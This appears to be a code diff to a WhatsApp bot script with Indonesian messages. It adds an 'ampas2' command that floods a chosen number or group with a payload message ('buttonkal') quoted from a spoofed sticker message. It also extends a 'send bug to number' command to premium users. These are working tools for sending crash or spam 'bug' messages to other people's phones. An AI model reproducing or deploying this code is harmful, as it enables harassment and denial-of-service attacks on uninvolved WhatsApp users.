@@ -443,17 +443,17 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
 },
 "message": {
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
-"mimetype": "application/octet-stream",
-"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
-"fileLength": "64455",
-"pageCount": 1,
-"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `${ownername}â˜£ï¸${xeonbrutal(prefix)}`,
-"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
-}}
-}
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false
+}}}
 
 const xezy = { 
 key: {
@@ -720,8 +720,30 @@ await sleep(1000)
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
+case 'ampas2' : {
+if (!isPremium && !isCreator) return
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await XeonBotInc.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(10000)
+}
+break
 case 'jagoanom' : {
-if (!isCreator) return
+if (!isPremium && !isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
